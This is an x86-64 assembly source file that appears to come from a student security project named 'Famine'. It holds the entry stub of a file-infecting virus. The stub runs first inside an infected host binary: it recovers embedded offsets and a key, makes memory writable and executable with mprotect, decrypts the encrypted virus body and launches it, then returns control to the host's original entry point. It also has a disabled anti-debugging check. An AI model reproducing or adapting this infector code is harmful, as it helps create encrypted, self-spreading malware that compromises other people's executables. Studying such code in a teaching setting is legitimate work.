; **************************************************************************** ;
;                                                                              ;
;                                                         :::      ::::::::    ;
;    famine.s                                           :+:      :+:    :+:    ;
;                                                     +:+ +:+         +:+      ;
;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
;    Updated: 2019/06/12 13:56:45 by spolowy          ###   ########.fr        ;
;                                                                              ;
; **************************************************************************** ;

%define SYSCALL_WRITE		0x1
%define SYSCALL_MPROTECT	0xa
%define STDOUT			0x1
%define PROT_RWX		0x7
%define CALL_INSTR_SIZE		0x5

section .text
	global famine_entry
	global _start

extern detect_spy
extern decrypt
extern virus

famine_entry:
;------------------------------; Store variables
	call mark_below
	db "128 bit key here", "rel ptld", "ptldsize", "relvirus"
	db "relentry", "virusize"
	db "fill me fill me",0 ; TMP
;------------------------------; Get variables address
; | 0    | *(16)       | *24         | *(32)       | *(40)        | *48        |
; | rdx  | r8          | r9          | r10         | r11          | r14        |
; | key  | rel ptld    | ptld size   | rel virus   | rel entry    | virus size |
; | key  | (ptld addr) | (ptld size) | (virus addr)| (entry addr) |(virus size)|
mark_below:
	pop rax
	push rdx                   ; backup rdx
	push r14                   ; backup r14

	mov rdx, rax

	mov r8, rdx
	mov r9, rdx
	mov r10, rdx
	mov r11, rdx
	mov r14, rdx
	add r8, 16                 ; align vars to correct addresses
	add r9, 24
	add r10, 32
	add r11, 40
	add r14, 48
	mov r8, [r8]               ; dereference vars
	mov r9, [r9]
	mov r10, [r10]
	mov r11, [r11]
	mov r14, [r14]

	mov rax, rdx               ; get famine_entry addr
	sub rax, CALL_INSTR_SIZE

	push r15                   ; backup r15
	mov r15, rax
	xchg r15, r8
	sub r8, r15                ; r8 = rax - r8
	mov r15, rax
	xchg r15, r10
	add r10, r15               ; r10 = rax + r10
	mov r15, rax
	xchg r15, r11
	sub r11, r15               ; r11 = rax - r11
	pop r15                    ; restore r15

	push rax                   ; save famine_entry  [rsp + 40]
	push r8                    ; save ptld addr     [rsp + 32]
	push r9                    ; save ptld size     [rsp + 24]
	push r10                   ; save virus addr    [rsp + 16]
	push r11                   ; save entry addr    [rsp + 8]
	push rdx                   ; save key           [rsp]
;------------------------------; Show-off
	mov rax, 0x00000a2e2e2e2e59
	push rax
	mov rax, 0x444f4f572e2e2e2e
	push rax

	; write(1, "....WOODY....\n", 14);
	mov rdi, STDOUT
	mov rsi, rsp
	mov rdx, 14
	mov rax, SYSCALL_WRITE
	syscall

	add rsp, 16
;------------------------------; check if client behaves well (comment for debug)
	; call detect_spy
	; test rax, rax
	; jnz return_to_client
;------------------------------; make ptld writable
	mov r8, [rsp + 32]         ; get ptld addr
	mov r9, [rsp + 24]         ; get ptld len

	;mprotect(ptld_addr, ptld_size, PROT_READ | PROT_WRITE | PROT_EXEC);
add r9, 0x2df0;TMp DEBUG
	mov rdi, r8
	mov rsi, r9
	mov rdx, PROT_RWX
	mov rax, SYSCALL_MPROTECT
	syscall
;------------------------------; decrypt virus
	mov rdx, [rsp]             ; get key
	mov r10, [rsp + 16]        ; get virus_addr

	mov rax, r14               ; get virus_size

	;decrypt(32, virus_addr, key, virus_size);
	mov rdi, 32
	mov rsi, r10
	mov rdx, rdx
	mov rcx, rax
	call decrypt
;------------------------------; launch virus
	mov rdi, rdx
	call virus
;------------------------------; return to client entry
return_to_client:
	mov r11, [rsp + 8]         ; get entry addr
	add rsp, 48                ; restore stack as it was
	pop r14                    ; restore r14
	pop rdx                    ; restore rdx
	push r11
	ret
